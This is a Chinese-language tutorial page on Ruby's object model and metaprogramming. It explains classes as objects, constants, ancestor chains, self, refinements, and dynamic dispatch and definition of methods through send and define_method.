<p>​    一个对象内部其实只包含了自身的实例变量和对自身类的引用，方法并不在对象中，而在类中。这就是同一类的实例共享方法，但不共享实例变量的原因。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># String实例的方法</span>
p <span class="token builtin">String</span><span class="token punctuation">.</span>instance_methods
<span class="token comment"># String实例方法+类方法</span>
p <span class="token builtin">String</span><span class="token punctuation">.</span>methods
<span class="token comment"># String忽略继承的方法</span>
p <span class="token builtin">String</span><span class="token punctuation">.</span>instance_methods<span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    在上面，我们先查看对象拥有的实例方法：<code>obj.instance_methods</code>，后面我们又查看了类的实例方法：<code>String.instance_methods</code>,发现并没有报错，那看来对象和类都拥有自己的实例方法，那能不能推断：<code>类本身也是一个对象</code></p>
<h4 id="类的真相-1"><a href="#类的真相-1" class="headerlink" title="类的真相"></a>类的真相</h4><p>​    在Ruby中类本身其实也是对象，是另一个类的实例。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># String类实际上是Class类的一个实例</span>
p <span class="token builtin">String</span><span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token comment"># => Class</span>
<span class="token comment"># 而Class类还是Class的实例</span>
p <span class="token builtin">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span>   <span class="token comment"># => Class</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这确实是挺绕的。不过这么看来一个类所拥有的方法就是Class类的实例方法。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">p <span class="token builtin">Class</span><span class="token punctuation">.</span>instance_methods<span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token comment"># => [:allocate, :superclass, :subclasses, :new]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​    这里看到Class的实例方法有四个，其中new是我们最常用的，allocate是new方法的支撑方法，而superclass与我们Java中熟悉的继承有关，找到他的父类是谁？</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">p <span class="token builtin">String</span><span class="token punctuation">.</span>superclass  <span class="token comment"># String的父类：Object</span>
p <span class="token builtin">Object</span><span class="token punctuation">.</span>superclass  <span class="token comment"># Object的父类：BasicObject</span>
p BasicObject<span class="token punctuation">.</span>superclass <span class="token comment"># BasicObject的父类：nil 空  到头了</span>

p <span class="token builtin">Class</span><span class="token punctuation">.</span>superclass   <span class="token comment"># Class的父类是 Module</span>
p <span class="token builtin">Module</span><span class="token punctuation">.</span>superclass  <span class="token comment"># Module的父类是 Object</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    可以看到Class是继承了Module，并自身定义了实例化的操作。所以类和模块儿使用上看起来那么像。</p>
<p>​    每个类最终继承于BasicObject，而每个类又是Class类的实例。</p>
<p><img src="../../typora-user-images/image-20230124214842752.png" alt="image-20230124214842752"></p>
<h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><p>​    任何大写字母开头的引用，都代表着常量，而常量一般指不会修改的东西，在Ruby中常亮也可以看做是变量，而当你修改，编译器会发出警告，但仍然会进行修改。常量与变量最大的区别在于作用域的不同。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">MyModule</span>
  <span class="token comment"># 外部的MyConstant</span>
	MyConstant <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Outer constant"</span></span>
	<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
    <span class="token comment"># 内部的MyConstant</span>
		MyConstant <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Inner constant"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
p MyModule<span class="token double-colon punctuation">::</span>MyConstant
p MyModule<span class="token double-colon punctuation">::</span>MyClass<span class="token double-colon punctuation">::</span>MyConstant<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    我们以树形结构为例：</p>
<p><img src="../../typora-user-images/image-20230124220328845.png" alt="image-20230124220328845">    </p>
<p>​    这里内部的MyConstant和外部的MyConstant实际上处于两个作用域中，是完全不同的东西，而我们可以通过<code>::</code>来访问他们</p>
<p>​    如果处于模块儿较深的位置，想用绝对路径来访问外部的常量，可以使用 :: 表示路径的根位置。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token constant">Y</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"a root-level constant"</span></span>
<span class="token keyword">module</span> <span class="token class-name">M</span>
	<span class="token constant">Y</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"a constant in M"</span></span>
	<span class="token double-colon punctuation">::</span><span class="token constant">Y</span>  <span class="token comment"># => "a root-level constant"</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    <code>Module.constants</code>会返回当前范围内所有常量，这里需要注意一点，Module中定义class，其类名也是一个常量。如果想知道当前代码所在路径，则可以知道<code>Module.nesting</code>方法。</p>
<p>​    而我们一般会利用常量域的不同，作为名称空间，这样避免类名冲突</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">M</span>
	<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span>
			puts <span class="token string-literal"><span class="token string">"hello"</span></span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
mc <span class="token operator">=</span> <span class="token constant">M</span><span class="token double-colon punctuation">::</span><span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
mc<span class="token punctuation">.</span>hi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="对象和类的小结"><a href="#对象和类的小结" class="headerlink" title="对象和类的小结"></a>对象和类的小结</h3><blockquote>
<p>什么是对象？</p>
</blockquote>
<p>对象就是一组实例变量外加一个指向其类的引用</p>
<blockquote>
<p>什么是类？</p>
</blockquote>
<p>类就是一个对象（Class类的一个实例），外加一组实例方法和对其超类的引用。</p>
<h3 id="使用名称空间"><a href="#使用名称空间" class="headerlink" title="使用名称空间"></a>使用名称空间</h3><p>​    当我们自定义一个类时，如果在一个复杂系统中，很有可能发生命名冲突，最好使用一个业务模块儿将自定义的类进行封装，这样发生命名冲突的概率也就降低了。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 可能导致bug</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token keyword">end</span>

<span class="token comment"># 通过 MyField::Test 来使用类，发生冲突的概率就降低了</span>
<span class="token keyword">module</span> <span class="token class-name">MyField</span>
  <span class="token keyword">class</span> <span class="token class-name">Test</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="调用方法时发生了什么？"><a href="#调用方法时发生了什么？" class="headerlink" title="调用方法时发生了什么？"></a>调用方法时发生了什么？</h3><ol>
<li>找到这个方法定义</li>
<li>执行这个方法，Ruby中需要借助<code>self</code>的东西</li>
</ol>
<h4 id="方法查找"><a href="#方法查找" class="headerlink" title="方法查找"></a>方法查找</h4><p>​    这里有两个概念：接收者和祖先链</p>
<p>​    比如说上面的代码 <code>mc.hi()</code> ,其中mc就是方法的接受者，在执行这个方法前需要先找到这个方法的定义，所以先到接收者中去找该方法，如果没有则找他的父类或者是引入的Module中寻找。而接收者，接受者内引入模块儿，父类共同构成了该对象的祖先链。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">M1</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">m1_method</span></span>
		<span class="token string-literal"><span class="token string">"m1.method"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">module</span> <span class="token class-name">M2</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">m2_method</span></span>
		<span class="token string-literal"><span class="token string">"m2.method"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token comment"># 引入M1，模块儿在祖先链中位置为自身类上面</span>
	<span class="token keyword">include</span> <span class="token constant">M1</span>  
	<span class="token comment"># 引入M2，模块儿在祖先链中位置为自身类下面</span>
	<span class="token keyword">prepend</span> <span class="token constant">M2</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">AC</span> <span class="token operator">&lt;</span> MyClass
<span class="token keyword">end</span>

<span class="token comment"># [AC, M2, MyClass, M1, Object, Kernel, BasicObject]</span>
p <span class="token constant">AC</span><span class="token punctuation">.</span>ancestors <span class="token comment"># 查看他的祖先链</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>如果在祖先链中多次引入一个module，会怎么样？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">M1</span><span class="token punctuation">;</span> <span class="token keyword">end</span>
p <span class="token constant">M1</span><span class="token punctuation">.</span>ancestors  <span class="token comment"># => [M1]</span>
<span class="token keyword">module</span> <span class="token class-name">M2</span>
	<span class="token keyword">include</span> <span class="token constant">M1</span>
<span class="token keyword">end</span>
p <span class="token constant">M2</span><span class="token punctuation">.</span>ancestors  <span class="token comment"># => [M2, M1]</span>
<span class="token keyword">module</span> <span class="token class-name">M3</span>
	<span class="token keyword">prepend</span> <span class="token constant">M1</span>
	<span class="token keyword">include</span> <span class="token constant">M2</span>
<span class="token keyword">end</span>
p <span class="token constant">M3</span><span class="token punctuation">.</span>ancestors  <span class="token comment"># => [M1, M3, M2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Kernel模块儿"><a href="#Kernel模块儿" class="headerlink" title="Kernel模块儿"></a>Kernel模块儿</h4><p>​    在Ruby中我们常常使用<code>print</code>，就好像所有对象都有print方法一样。但实际上这些方法来着<code>Kernel</code>模块儿私有实例方法，因为Object引入了Kernel，所以每个对象都可以调用Kernel方法，也叫做内核方法，我们当然也可以加入自己的方法，这样所有的对象都拥有了新的方法 </p>
<h4 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h4><blockquote>
<p>当我们找到了该方法，如何去执行呢？</p>
</blockquote>
<p>比如我们现在找到了该方法：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
		<span class="token variable">@x</span> <span class="token operator">=</span> <span class="token number">1</span>
	<span class="token keyword">end</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
	  p <span class="token keyword">self</span>   <span class="token comment"># => #&lt;MyClass:0x000000010dcdb320 @x=1> self为obj</span>
	  temp <span class="token operator">=</span> <span class="token variable">@x</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 这里实例变量@x 也是访问self内定义的</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>my_method  <span class="token comment"># obj调用my_method时，obj为当前对象self</span>
p <span class="token keyword">self</span>         <span class="token comment"># => main , 在顶级作用域下，调用 p ,接受者为main对象，main为self</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>请问：@x是属于哪个对象的，my_method属于哪个对象？</p>
</blockquote>
<p>​    一般情况下，会将最初方法的接收者作为当前对象，也就是作为self，所有实例变量和方法都属于self，如果没有明确指定接受者的实际上都指向self，除非转而调用其他对象的方法，则self就会转为这个对象。</p>
<blockquote>
<p>​    Ruby中 private 修饰的方法，不能明确指定接受者来调用私有方法，只能通过隐性的接受者self调用。这与Java中对私有方法的定义是不同的</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hi</span></span>
		p <span class="token string-literal"><span class="token string">"Hi "</span></span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">Hello</span></span>
		<span class="token comment"># 这里Hello 调用 私有方法hello ，使用的隐藏当前对象,也就是下面的obj</span>
		hello
	<span class="token keyword">end</span>

	<span class="token keyword">private</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hello</span></span> 
		p <span class="token string-literal"><span class="token string">"hello"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>hi     <span class="token comment"># 正常调用</span>
obj<span class="token punctuation">.</span>Hello  <span class="token comment"># 正常调用</span>
obj<span class="token punctuation">.</span>hello  <span class="token comment"># 无法调用，因为private方法不能指定接收者调用，只能隐性调用，也就是内部调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="顶层上下文"><a href="#顶层上下文" class="headerlink" title="顶层上下文"></a>顶层上下文</h4><blockquote>
<p>如果没有调用任何方法，那这时谁是self呢？</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># main</span>
p <span class="token keyword">self</span>
<span class="token comment"># Object</span>
p <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token keyword">class</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在Ruby程序运行时，Ruby解释器创建一个名为main对象作为当前对象，这个对象有时被称为顶层上下文。此时处于调用堆栈的顶层</p>
<h3 id="类定于与self"><a href="#类定于与self" class="headerlink" title="类定于与self"></a>类定于与self</h3><p>​    在定义类或模块儿时（且在任何方法定义之外），self对象由这个类或模块儿本身担任</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
  <span class="token keyword">self</span>  <span class="token comment"># => MyClass</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="细化"><a href="#细化" class="headerlink" title="细化"></a>细化</h4><p>​    在前面我们使用了猴子补丁对原有的类进行修改，但这一操作是全局性的，如果把控不好，会导致许多隐性的Bug，所以Ruby又引入了<code>细化(refinement)</code>,起到同样的作用，但是可以限制作用域。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">StringAppend</span>
  <span class="token comment"># 细化 String 标准类库，传入一个Block</span>
	refine <span class="token builtin">String</span> <span class="token keyword">do</span>
    <span class="token comment"># 在Block内，定义一个append_txt方法，现在self转为String，相当于给String定义实例方法</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">append_txt</span></span>
			to_s <span class="token operator">+</span> <span class="token string-literal"><span class="token string">".txt"</span></span>
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token keyword">module</span> <span class="token class-name">StringStuff</span>
	<span class="token comment"># 上面定义好，并未生效，需要主动启动 using</span>
	using StringAppend
	<span class="token comment"># 这里正常执行</span>
	p <span class="token string-literal"><span class="token string">"alibaba"</span></span><span class="token punctuation">.</span>append_txt
<span class="token keyword">end</span>
<span class="token comment"># 这里就会报错，因为跳回了顶层上下文，这里没有引入对String细化，</span>
<span class="token comment"># 所以通过细化，可以控制修改的访问范围，不会使全局都看到这个修改</span>
p <span class="token string-literal"><span class="token string">"taobao"</span></span><span class="token punctuation">.</span>append_txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    细化只在两种场合有效：</p>
<ol>
<li><code>refine</code>代码块内部</li>
<li><code>using</code>语句位置到模块儿结束，或者到文件结束（在顶层上下文使用using）</li>
</ol>
<h5 id="细化的陷阱"><a href="#细化的陷阱" class="headerlink" title="细化的陷阱"></a>细化的陷阱</h5><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
		p <span class="token string-literal"><span class="token string">"old method"</span></span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">other_method</span></span>
		my_method
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">module</span> <span class="token class-name">MyClassRefinement</span>
	refine MyClass <span class="token keyword">do</span>
		<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
			p <span class="token string-literal"><span class="token string">"new method"</span></span>
		<span class="token keyword">end</span>	
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token comment"># 在顶级上下文中使用using</span>
using MyClassRefinement

obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
<span class="token comment"># 这里已经更新为细化后修改的内容</span>
obj<span class="token punctuation">.</span>my_method  <span class="token comment"># => new method</span>
<span class="token comment"># 这里仍维持原先的内容</span>
obj<span class="token punctuation">.</span>other_method <span class="token comment"># => old method</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里虽然使用了细化，但当其他实例方法调用细化方法，还是会调用之前定义的代码，如果直接调用细化方法，则修改为细化内容。需要注意：Ruby规定虽然可以在一个普通的模块儿中调用refine方法，但不能在类中调用这个方法</p>
<h3 id="对象模型总结"><a href="#对象模型总结" class="headerlink" title="对象模型总结"></a>对象模型总结</h3><ul>
<li>对象由一组实例变量和类的引用组成</li>
<li>对象的方法存在于对象所属的类中（对类来说是实例方法）</li>
<li>类本身是Class类的对象，类的名字只是一个常量</li>
<li>Class类是Module的子类，一个模块儿基本上就是由一组方法组成的包，类除了具有模块儿的特性以外，还可以被实例化（使用new方法），或者按照一定的层次结构来组织（使用superclass方法）</li>
<li>常量像文件系统一样，是按照树形结构组织的，其中模块儿和类的名字扮演目录的校色，其他普通常量扮演文件的校色</li>
<li>每个类都有一个祖先链，这个链从每个类自己开始（pretend Module会在类本身之前），向上直到BasicObject类结束</li>
<li>调用方法时，Ruby首先向右找到接受者所属的类，然后向上查找祖先链，直到找到该方法或达到链的顶端</li>
<li>在类中包含一个模块儿，使用<code>include</code>方法时，模块插入祖先链中，位置在类的正上方，使用prepend方法包含一个模块儿时，这个模块儿也会被插入祖先链中，位置在类的正下方</li>
<li>调用一个方法时，接受者会扮演self的对象</li>
<li>定义一个模块儿（或类）时，该模块儿扮演self对象</li>
<li>实例变量永远被认定为self的实例变量</li>
<li>没有明确指定接收者的方法调用，都被当做是调用self的方法</li>
<li>细化像是在原有的类上添加了一块儿补丁，并且会覆盖正常方法的方法查找，并且细化只在部分区域生效。 </li>
</ul>
<h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p>​    在Ruby这种动态语言中，方法的调用是极为灵活的，并不会在编译器就爆出各种错误，比方说我定义一个User类，我想调用hi方法，我并没有定义hi方法，但这并不妨碍我编写代码，运行期我去找hi方法，如果发现没有这个方法，最终我可以向这个类中添加我想要的方法在运行期间。这给了我们更多的操作空间，这将是我们要学习的。</p>
<blockquote>
<p>现在我们有一个老的系统需要我们重构，老板要求系统自动为超过99美金的开销天添加标记</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">DS</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span> <span class="token punctuation">;</span> <span class="token keyword">end</span><span class="token comment"># 连接数据源</span>

  <span class="token comment"># 原先设计的访问方法</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_cpu_info</span></span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_cpu_price</span></span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_mouse_info</span></span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_mouse_price</span></span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_keyBoard_info</span></span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">get_keyBoard_price</span></span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">end</span>
<span class="token keyword">end</span>
ds <span class="token operator">=</span> <span class="token class-name">DS</span><span class="token punctuation">.</span><span class="token keyword">new</span>
<span class="token comment"># 获取信息</span>
ds<span class="token punctuation">.</span>get_cpu_info<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment"># 获取价格</span>
ds<span class="token punctuation">.</span>get_cpu_price<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们现在需要将数据源封装起来，每个computer为一个对象，并为每个组件定义通用的方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Computer</span>
  <span class="token comment"># data_source 就是上面的DS对象</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>computer_id<span class="token punctuation">,</span>data_source<span class="token punctuation">)</span>
		<span class="token variable">@id</span> <span class="token operator">=</span> computer_id
		<span class="token variable">@data_source</span> <span class="token operator">=</span> data_source
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">mouse</span></span>
		info <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>get_mouse_info<span class="token punctuation">(</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		price <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>get_mouse_price<span class="token punctuation">(</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Mouse: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">info</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> : (</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">price</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">)"</span></span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"*"</span></span> <span class="token operator">+</span> result <span class="token keyword">if</span> price <span class="token operator">></span> <span class="token number">99</span>
		<span class="token keyword">return</span> result
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">cpu</span></span>
		info <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>get_cpu_info<span class="token punctuation">(</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		price <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>get_cpu_price<span class="token punctuation">(</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Cpu: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">info</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> : (</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">price</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">)"</span></span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"*"</span></span> <span class="token operator">+</span> result <span class="token keyword">if</span> price <span class="token operator">></span> <span class="token number">99</span>
		<span class="token keyword">return</span> result
	<span class="token keyword">end</span>

	<span class="token comment"># ... 类似操作</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    我们可以看到 mouse 和 cpu 就有大量的代码重复，如果后面还需要加其他的，则会让代码臃肿且冗余。</p>
<p>​    我们有两种办法进行重构优化：<code>动态方法 和 method_missing</code></p>
<h3 id="动态方法"><a href="#动态方法" class="headerlink" title="动态方法"></a>动态方法</h3><h4 id="动态调用方法"><a href="#动态调用方法" class="headerlink" title="动态调用方法"></a>动态调用方法</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">method</span></span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span>
obj<span class="token punctuation">.</span>method <span class="token string-literal"><span class="token string">"Hello World"</span></span>
<span class="token comment"># 动态派发和上面普通调用的结果是一样的, 将 obj.method 替换为 obj.send(:method)</span>
obj<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token symbol">:method</span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"Hello World"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>为什么使用动态派发？</p>
</blockquote>
<p>​    因为可以在运行最后才决定具体调用哪个方法。而不是硬编码决定</p>
<blockquote>
<p>这里使用<code>:method</code>，而不是”method”，实际上是一样的</p>
</blockquote>
<p><code>obj.send(&quot;method&quot;,&quot;Hello World&quot;)</code></p>
<p>​    :method 表示的是一个Symbol符号</p>
<p>​    “method”则是一个String字符串，一般在元编程我们常常使用Symbol，因为Symbol是不可变的。字符串是可变的。</p>
<blockquote>
<p>符号与字符串是很容易相互转化的</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token string-literal"><span class="token string">"abc"</span></span><span class="token punctuation">.</span>to_sym <span class="token comment"># => :abc</span>
<span class="token symbol">:abc</span><span class="token punctuation">.</span>to_s    <span class="token comment"># => "abc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="动态定义方法"><a href="#动态定义方法" class="headerlink" title="动态定义方法"></a>动态定义方法</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">MyClass</span>
	<span class="token comment"># 这里就是定义了一个实例方法 将 def my_method 替换为 define_method :my_method，参数部分，通过Block传递</span>
	<span class="token keyword">define_method</span> <span class="token symbol">:my_method</span> <span class="token keyword">do</span> <span class="token operator">|</span>my_arg<span class="token operator">|</span>
		my_arg <span class="token operator">*</span> <span class="token number">3</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">MyClass</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
obj<span class="token punctuation">.</span>my_method <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    在运行时定义方法的技术称为<strong>动态方法</strong>。<code>Module#define_method</code></p>
<blockquote>
<p>为什么使用动态方法，而不是直接定义：def</p>
</blockquote>
<p>​    因为这样可以在运行最后决定方法名叫什么，和上面动态调用方法类似，我们想在运行期间再决定一些事情</p>
